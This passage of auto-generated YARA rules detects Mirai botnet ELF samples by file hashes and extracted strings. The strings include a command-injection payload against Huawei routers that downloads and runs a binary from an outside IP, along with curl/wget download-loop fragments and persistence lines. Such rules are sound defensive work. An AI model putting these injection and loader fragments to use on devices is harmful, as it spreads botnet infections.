      $s6 = "any.dns.oracle.com" fullword ascii /* score: '21.00'*/
      $s7 = "ipv6.google.com" fullword ascii /* score: '21.00'*/
      $s8 = "any.microsoft-dns.com" fullword ascii /* score: '21.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
      $s11 = "any.cdn77.com" fullword ascii /* score: '18.00'*/
      $s12 = "large-dns.akamai.com" fullword ascii /* score: '18.00'*/
      $s13 = "kill_process" fullword ascii /* score: '15.00'*/
      $s14 = "process_killer_loop" fullword ascii /* score: '15.00'*/
      $s15 = "/saml2/login" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__73ca547c_Mirai_signature__81d021df_Mirai_signature__8206a861_Mirai_signature__8302c836_Mirai_signature__84_8 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_73ca547c.elf, Mirai(signature)_81d021df.elf, Mirai(signature)_8206a861.elf, Mirai(signature)_8302c836.elf, Mirai(signature)_84cec034.elf, Mirai(signature)_869f50c7.elf, Mirai(signature)_88205620.elf, Mirai(signature)_8973b175.elf, Mirai(signature)_953cfae4.elf, Mirai(signature)_95b1d1e3.elf, Mirai(signature)_9e3be224.elf, Mirai(signature)_a5e80f51.elf, Mirai(signature)_a7fe34dc.elf, Mirai(signature)_aed09a9b.elf, Mirai(signature)_b0523bbf.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "73ca547c2e29de12ca67bc3536063726d39a8790d525a301bf9d761d3e9831b9"
      hash2 = "81d021df259a9807f640230795a4a41f96b1ec5ae97d874e2161dc389fbf353c"
      hash3 = "8206a86179a3c93abee46ec9a8aa7b9157af261afd0b128394941b5dface1571"
      hash4 = "8302c83694202e1b6616add00b33d904c1c33c585d4646e414b1073800cfdb6d"
      hash5 = "84cec0346f281832bb14a14d363f194bfda474e57b7eed9741c37e5fa681d327"
      hash6 = "869f50c722c0eda6579569094f25ecae49e8ff5235fda937e4f147a1222dbebe"
      hash7 = "88205620c6b85a7794fcbda32ef9069f54ecaac56663de3acfb6bfd0a067fec0"
      hash8 = "8973b175c2ccc969cea9ca7b92996b2195653ae15f62d16514b9e3f1c6b01b0b"
      hash9 = "953cfae41801e12a9348e85fc2814507ebcd82365f4b26ed661216208a6f0318"
      hash10 = "95b1d1e3cf008a6d5d9afb027f6accb6aa42fca9ad1c2a51eaaaf274adde6b4a"
      hash11 = "9e3be2242a558e993d1f7628f9f3c99944c9e6aa3fa8b3524c3674b2de377b74"
      hash12 = "a5e80f511ec892b0aafa357139a0ab79322a31d241d598be6708826728bcf3f8"
      hash13 = "a7fe34dc6f89c8dc0aa3af74ee7c84838e41f0ea6406e4b319f9e7c77c5e3eb9"
      hash14 = "aed09a9bdee6641559c39bdf59806c8fce9ced606fbe4efccf6db1e9aa2245b2"
      hash15 = "b0523bbf3faa14375a6721e456e5950a456ed3903e7f108acdb489e4c1d613d7"
   strings:
      $s1 = "_Unwind_decode_target2" fullword ascii /* score: '16.00'*/
      $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s3 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii /* score: '14.00'*/
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii /* score: '11.00'*/
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s6 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii /* score: '11.00'*/
      $s8 = "_Unwind_EHT_Header" fullword ascii /* score: '9.00'*/
      $s9 = "fnoffset" fullword ascii /* score: '8.00'*/
      $s10 = "bitpattern" fullword ascii /* score: '8.00'*/
      $s11 = "fnstart" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6d144ff0_Mirai_signature__6ff21f19_Mirai_signature__70ae2421_Mirai_signature__70e11049_Mirai_signature__70_9 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6d144ff0.elf, Mirai(signature)_6ff21f19.elf, Mirai(signature)_70ae2421.elf, Mirai(signature)_70e11049.elf, Mirai(signature)_70f473c7.elf, Mirai(signature)_73ca547c.elf, Mirai(signature)_7cd90cfd.elf, Mirai(signature)_7e528454.elf, Mirai(signature)_81d021df.elf, Mirai(signature)_8206a861.elf, Mirai(signature)_8302c836.elf, Mirai(signature)_844ac003.elf, Mirai(signature)_848869fb.elf, Mirai(signature)_84cec034.elf, Mirai(signature)_85522c0c.elf, Mirai(signature)_869f50c7.elf, Mirai(signature)_88205620.elf, Mirai(signature)_8973b175.elf, Mirai(signature)_89fa8230.elf, Mirai(signature)_919d2b3d.elf, Mirai(signature)_93f45b93.elf, Mirai(signature)_9538fec5.elf, Mirai(signature)_953cfae4.elf, Mirai(signature)_95b1d1e3.elf, Mirai(signature)_994c14d7.elf, Mirai(signature)_9e3be224.elf, Mirai(signature)_9eada9e7.elf, Mirai(signature)_a3bf5ed2.elf, Mirai(signature)_a5e80f51.elf, Mirai(signature)_a7fe34dc.elf, Mirai(signature)_a915b420.elf, Mirai(signature)_a99c4815.elf, Mirai(signature)_aa2a31bc.elf, Mirai(signature)_aa73dbf2.elf, Mirai(signature)_aace2180.elf, Mirai(signature)_ab270778.elf, Mirai(signature)_ae93d820.elf, Mirai(signature)_aed09a9b.elf, Mirai(signature)_b0523bbf.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d144ff0ea4ee4c4b69c74316a9e0316db85efb4b24eee079238ca699c8d22b4"
      hash2 = "6ff21f19a4a1562c280c1fb54b59c5e3463615a6f3351474fb7d1e7c4efc9b56"
      hash3 = "70ae2421c44888060b21a1bd3d083c12394a34f76f27b89a15a84684162aa2e5"
      hash4 = "70e110499d9b759dd240fad8e9a79bf21cb61801ef7f9bd7de9e4fe2b840ab4d"
      hash5 = "70f473c758172b4c8daebde3ec69f553dd250bfe49b65e15d8acfcc2383ba202"
      hash6 = "73ca547c2e29de12ca67bc3536063726d39a8790d525a301bf9d761d3e9831b9"
      hash7 = "7cd90cfd49f396a76d90a287400e3b0190535bc50457419c9b8689409a99954f"
      hash8 = "7e528454073e710cadec7898d48732ef5ea60abe6951b5c4c4da7478f43f7483"
      hash9 = "81d021df259a9807f640230795a4a41f96b1ec5ae97d874e2161dc389fbf353c"
      hash10 = "8206a86179a3c93abee46ec9a8aa7b9157af261afd0b128394941b5dface1571"
      hash11 = "8302c83694202e1b6616add00b33d904c1c33c585d4646e414b1073800cfdb6d"
      hash12 = "844ac003aa6961360aa376bb5cc0deee0e48fcf688bdc8ece09a86cea4cb7f01"
      hash13 = "848869fbc73a981e67d9d828fbd59729bc07b88bd8d4677d8c8988aa2a5c07da"
      hash14 = "84cec0346f281832bb14a14d363f194bfda474e57b7eed9741c37e5fa681d327"
      hash15 = "85522c0c606792d409f3dd9faf8f89d72378c6b31e6d04bd5e4ad7d9c96fccd6"
      hash16 = "869f50c722c0eda6579569094f25ecae49e8ff5235fda937e4f147a1222dbebe"
      hash17 = "88205620c6b85a7794fcbda32ef9069f54ecaac56663de3acfb6bfd0a067fec0"
      hash18 = "8973b175c2ccc969cea9ca7b92996b2195653ae15f62d16514b9e3f1c6b01b0b"
      hash19 = "89fa82309afe76391b58e5d7a611e41d9743304f9d552fd10510cf062463928c"
      hash20 = "919d2b3dd85c5d1e9191cd3c972135a7a570bcc8c54193f74062aec265adf843"
      hash21 = "93f45b931fa5ad9803f8ed844bb4b7bac84bac9a1acd44c3dcb52a5441cb04ed"
      hash22 = "9538fec56c2f7397772a1d3bd3a909165b295ee2acbe4a8349735d270fb6926f"
      hash23 = "953cfae41801e12a9348e85fc2814507ebcd82365f4b26ed661216208a6f0318"
      hash24 = "95b1d1e3cf008a6d5d9afb027f6accb6aa42fca9ad1c2a51eaaaf274adde6b4a"
      hash25 = "994c14d7ab6080f0eb3ba996371ce1438bba81cceaf120852832f29fb5df0340"
      hash26 = "9e3be2242a558e993d1f7628f9f3c99944c9e6aa3fa8b3524c3674b2de377b74"
      hash27 = "9eada9e76633b0ee6b5e79d12976e46f8c5b6e5a91e15e3ef0143a5958cbeb0c"
      hash28 = "a3bf5ed2eb9c21403a3894b0f182ea6d21eb571dcaa566fbf9d02473303edc4c"
      hash29 = "a5e80f511ec892b0aafa357139a0ab79322a31d241d598be6708826728bcf3f8"
      hash30 = "a7fe34dc6f89c8dc0aa3af74ee7c84838e41f0ea6406e4b319f9e7c77c5e3eb9"
      hash31 = "a915b420e954036c4fc660f627a19d197aa605100f0bc7903a615e08703b5a7f"
      hash32 = "a99c4815b1e9e3e80c5153d00e7d6cf56994b81cfec6570a018472b89b82bac1"
      hash33 = "aa2a31bc57e8e83fcf8c757acd5eeb2aacb0a528486c314c0574e5e93d8962e4"
      hash34 = "aa73dbf28fe4883fdf873a3a0ffb19796bf7ac1da5e1e59a4fda535ed9247ae3"
      hash35 = "aace21809106166db09e47921b7db054de61e6f62b4dfc98c7297b7245f0f908"
      hash36 = "ab270778dd3275544a794b0961f2880965f340a3a2c1b51b1c2f343163e7c59c"
      hash37 = "ae93d820fb2fd9ec80de19f11ef6254b741d96de849f449ef664334e410eb8a6"
      hash38 = "aed09a9bdee6641559c39bdf59806c8fce9ced606fbe4efccf6db1e9aa2245b2"
      hash39 = "b0523bbf3faa14375a6721e456e5950a456ed3903e7f108acdb489e4c1d613d7"
   strings:
      $s1 = "__pthread_mutex_init" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s3 = "__pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s4 = "getpid.c" fullword ascii /* score: '9.00'*/
      $s5 = "__GI_fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s6 = "fgetc_unlocked.c" fullword ascii /* score: '9.00'*/
      $s7 = "fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s8 = "getegid.c" fullword ascii /* score: '9.00'*/
      $s9 = "fgets.c" fullword ascii /* score: '9.00'*/
      $s10 = "__GI_geteuid" fullword ascii /* score: '9.00'*/
      $s11 = "__GI_tcgetattr" fullword ascii /* score: '9.00'*/
      $s12 = "__fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s13 = "fgets_unlocked" fullword ascii /* score: '9.00'*/
      $s14 = "getgid.c" fullword ascii /* score: '9.00'*/
      $s15 = "getuid.c" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6d144ff0_Mirai_signature__70ae2421_Mirai_signature__70f473c7_Mirai_signature__844ac003_Mirai_signature__84_10 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6d144ff0.elf, Mirai(signature)_70ae2421.elf, Mirai(signature)_70f473c7.elf, Mirai(signature)_844ac003.elf, Mirai(signature)_848869fb.elf, Mirai(signature)_85522c0c.elf, Mirai(signature)_869f50c7.elf, Mirai(signature)_89fa8230.elf, Mirai(signature)_919d2b3d.elf, Mirai(signature)_9538fec5.elf, Mirai(signature)_9eada9e7.elf, Mirai(signature)_a3bf5ed2.elf, Mirai(signature)_a99c4815.elf, Mirai(signature)_aa2a31bc.elf, Mirai(signature)_ab270778.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d144ff0ea4ee4c4b69c74316a9e0316db85efb4b24eee079238ca699c8d22b4"
      hash2 = "70ae2421c44888060b21a1bd3d083c12394a34f76f27b89a15a84684162aa2e5"
      hash3 = "70f473c758172b4c8daebde3ec69f553dd250bfe49b65e15d8acfcc2383ba202"
      hash4 = "844ac003aa6961360aa376bb5cc0deee0e48fcf688bdc8ece09a86cea4cb7f01"
      hash5 = "848869fbc73a981e67d9d828fbd59729bc07b88bd8d4677d8c8988aa2a5c07da"
      hash6 = "85522c0c606792d409f3dd9faf8f89d72378c6b31e6d04bd5e4ad7d9c96fccd6"
      hash7 = "869f50c722c0eda6579569094f25ecae49e8ff5235fda937e4f147a1222dbebe"
      hash8 = "89fa82309afe76391b58e5d7a611e41d9743304f9d552fd10510cf062463928c"
      hash9 = "919d2b3dd85c5d1e9191cd3c972135a7a570bcc8c54193f74062aec265adf843"
      hash10 = "9538fec56c2f7397772a1d3bd3a909165b295ee2acbe4a8349735d270fb6926f"
      hash11 = "9eada9e76633b0ee6b5e79d12976e46f8c5b6e5a91e15e3ef0143a5958cbeb0c"
      hash12 = "a3bf5ed2eb9c21403a3894b0f182ea6d21eb571dcaa566fbf9d02473303edc4c"
      hash13 = "a99c4815b1e9e3e80c5153d00e7d6cf56994b81cfec6570a018472b89b82bac1"
      hash14 = "aa2a31bc57e8e83fcf8c757acd5eeb2aacb0a528486c314c0574e5e93d8962e4"
      hash15 = "ab270778dd3275544a794b0961f2880965f340a3a2c1b51b1c2f343163e7c59c"
   strings:
      $s1 = "Origin: https://%s.com" fullword ascii /* score: '24.00'*/
      $s2 = "Origin: https://www.instagram.com" fullword ascii /* score: '21.00'*/
      $s3 = "Origin: https://www.microsoft.com" fullword ascii /* score: '21.00'*/
      $s4 = "X-Akamai-Origin: https://www.example.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.apple.com" fullword ascii /* score: '21.00'*/
      $s6 = "Referer: https://www.microsoft.com/" fullword ascii /* score: '17.00'*/
      $s7 = "Referer: https://www.instagram.com/" fullword ascii /* score: '17.00'*/
      $s8 = "Referer: https://www.apple.com/" fullword ascii /* score: '17.00'*/
      $s9 = "Referer: https://www.google.com/search?q=%s" fullword ascii /* score: '17.00'*/
      $s10 = "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3" ascii /* score: '16.00'*/
      $s11 = "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3" ascii /* score: '16.00'*/
      $s12 = "ORIGIN-BYPASS" fullword ascii /* score: '15.00'*/
      $s13 = "HttpUserAgents" fullword ascii /* score: '15.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.7" ascii /* score: '14.00'*/
      $s15 = "HOST-OVERRIDE" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6ff21f19_Mirai_signature__7cd90cfd_Mirai_signature__7e528454_Mirai_signature__994c14d7_Mirai_signature__aa_11 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6ff21f19.elf, Mirai(signature)_7cd90cfd.elf, Mirai(signature)_7e528454.elf, Mirai(signature)_994c14d7.elf, Mirai(signature)_aa73dbf2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6ff21f19a4a1562c280c1fb54b59c5e3463615a6f3351474fb7d1e7c4efc9b56"
      hash2 = "7cd90cfd49f396a76d90a287400e3b0190535bc50457419c9b8689409a99954f"
      hash3 = "7e528454073e710cadec7898d48732ef5ea60abe6951b5c4c4da7478f43f7483"
      hash4 = "994c14d7ab6080f0eb3ba996371ce1438bba81cceaf120852832f29fb5df0340"
      hash5 = "aa73dbf28fe4883fdf873a3a0ffb19796bf7ac1da5e1e59a4fda535ed9247ae3"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '44.00'*/
      $s2 = " -g 92.113.147.23 -l /tmp/kh -r /mips; /bin/busybox chmod 777 * /tmp/kh; /tmp/kh huawei)</NewStatusURL><NewDownloadURL>$(echo HU" ascii /* score: '30.00'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                      ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */ /* score: '26.50'*/
      $s7 = "aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                         ' */ /* score: '24.00'*/
      $s8 = "cyppsxe20t3pu2m8bl88qsyd6uhhl22onwrjn76gs9tad69ms27q7a5knzmcfaj489791cmdwjfveeij9efmoieks6ob1t8eviul7z6fuhq1nkr6jn4piqisqxmabl4o" ascii /* score: '18.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s11 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)" fullword ascii /* score: '15.00'*/
      $s12 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s13 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s14 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56" fullword ascii /* score: '12.00'*/
      $s15 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__70e47b3f_Mirai_signature__8206a861_Mirai_signature__84cec034_Mirai_signature__8aa1abbc_Mirai_signature__a4_12 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_70e47b3f.elf, Mirai(signature)_8206a861.elf, Mirai(signature)_84cec034.elf, Mirai(signature)_8aa1abbc.elf, Mirai(signature)_a45daf39.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "70e47b3f334a8eac64cbead5598dbc7d42e4e2f693eb89bbb9d161bb9e8d7bf0"
      hash2 = "8206a86179a3c93abee46ec9a8aa7b9157af261afd0b128394941b5dface1571"
      hash3 = "84cec0346f281832bb14a14d363f194bfda474e57b7eed9741c37e5fa681d327"
      hash4 = "8aa1abbc2e72a49bb19df3904d081a6d05b2197ae904deb517880d9a9ac8a1ef"
      hash5 = "a45daf39e113c368af68d3c66996d48b4a24462ddbf6038af415ee0979715ef0"
   strings:
      $s1 = "GET /?%s%d HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s2 = "test@example.com" fullword ascii /* score: '18.00'*/
      $s3 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" fullword ascii /* score: '17.00'*/
      $s4 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" fullword ascii /* score: '17.00'*/
      $s5 = "/proxy.txt" fullword ascii /* score: '14.00'*/
      $s6 = "/downloads/brochure.pdf" fullword ascii /* score: '13.00'*/
      $s7 = "/login" fullword ascii /* score: '12.00'*/
      $s8 = "/assets/images/logo.png" fullword ascii /* score: '12.00'*/
      $s9 = "/wp-content/uploads/2023/" fullword ascii /* score: '11.00'*/
      $s10 = "Product description text" fullword ascii /* score: '10.00'*/
      $s11 = "Warning: Failed to load proxies, continuing with direct connections" fullword ascii /* score: '10.00'*/
      $s12 = "\"Opera\";v=\"107\", \"Chromium\";v=\"121\", \"Not?A_Brand\";v=\"24\"" fullword ascii /* score: '9.00'*/
      $s13 = "This is a test message with some content" fullword ascii /* score: '9.00'*/
      $s14 = "\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\"" fullword ascii /* score: '9.00'*/
      $s15 = "200 Connection established" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6d36c21a_Mirai_signature__70e47b3f_Mirai_signature__8206a861_Mirai_signature__84cec034_Mirai_signature__8a_13 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6d36c21a.elf, Mirai(signature)_70e47b3f.elf, Mirai(signature)_8206a861.elf, Mirai(signature)_84cec034.elf, Mirai(signature)_8aa1abbc.elf, Mirai(signature)_98ddba6e.elf, Mirai(signature)_9c64403e.elf, Mirai(signature)_a45daf39.elf, Mirai(signature)_af915026.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d36c21a863c7722d3d947ab9f0ac9abbe3dc9f12f031e0879a55c86d147d4f7"
      hash2 = "70e47b3f334a8eac64cbead5598dbc7d42e4e2f693eb89bbb9d161bb9e8d7bf0"
      hash3 = "8206a86179a3c93abee46ec9a8aa7b9157af261afd0b128394941b5dface1571"
      hash4 = "84cec0346f281832bb14a14d363f194bfda474e57b7eed9741c37e5fa681d327"
      hash5 = "8aa1abbc2e72a49bb19df3904d081a6d05b2197ae904deb517880d9a9ac8a1ef"
      hash6 = "98ddba6e47f4d3e446df9412bb9cc9a9cb10ab115e8e33f096968029125cc727"
      hash7 = "9c64403e061cc02d28e1883aba061f9c580c61d11a8d9f91530f12bab686061c"
      hash8 = "a45daf39e113c368af68d3c66996d48b4a24462ddbf6038af415ee0979715ef0"
      hash9 = "af91502655331308b7b116b0bb264f08c62e7bd6a8799651d0771e32049207bc"
   strings:
      $s1 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0" fullword ascii /* score: '14.00'*/
      $s4 = "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s5 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s8 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0." ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s15 = "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6db3a177_Mirai_signature__7cee4ac4_Mirai_signature__7f7f0d71_Mirai_signature__8d37351f_Mirai_signature__8e_14 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6db3a177.elf, Mirai(signature)_7cee4ac4.elf, Mirai(signature)_7f7f0d71.elf, Mirai(signature)_8d37351f.elf, Mirai(signature)_8e515c52.elf, Mirai(signature)_9676d340.elf, Mirai(signature)_9db44728.elf, Mirai(signature)_aa3734d3.elf, Mirai(signature)_ac47df80.elf, Mirai(signature)_ac5d1b44.elf, Mirai(signature)_ad6b7a16.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6db3a1777017535d3135eaa931e02a5512be5eec3571261740d71addc050a9e6"
      hash2 = "7cee4ac4c5c52fb2d0c2d6edd4dec611dfebace1eae0d58d56b2429ff5a66397"
      hash3 = "7f7f0d711bbb3fd8c747e86a594c875ace72c37a48c3b1332e14a84f92bfd0ab"
      hash4 = "8d37351feb40c8cffa43b778bc7087eb6b516b5e498244e640ab366d276d4800"
      hash5 = "8e515c524d7749bc86597c8b5b7759683fa8a614b8ab125c67ef2397bb057d6e"
      hash6 = "9676d340c5229ce5c1a79621e346bce300e02f5736133bba695438daaad87a30"
      hash7 = "9db4472896aa7f67644efc5cac5ad0022c0baa5e18e4adfb9ae9fb6d92ad8749"
      hash8 = "aa3734d3fc00b1ba582d9b2ba250db27334e5b094d1c40ee62234614afafce60"
      hash9 = "ac47df80a238e71e50a70d4b63755a33db18654650a145e56838276135d6c8a6"
      hash10 = "ac5d1b44b3ac7c62d5e5872279097c57d5d3cd3992c88773fb9d86f8013388bf"
      hash11 = "ad6b7a1640f575d8c0234516f5b5c68444df92e096ead00bc8501824951c7cb1"
   strings:
      $s1 = "          rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s2 = "      rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s3 = "        rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s4 = "After=network.target multi-user.target" fullword ascii /* score: '17.00'*/
      $s5 = "WantedBy=multi-user.target default.target" fullword ascii /* score: '17.00'*/
      $s6 = "      for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 " ascii /* score: '15.00'*/
      $s7 = "    for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 -O" ascii /* score: '15.00'*/
      $s8 = "      for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 " ascii /* score: '15.00'*/
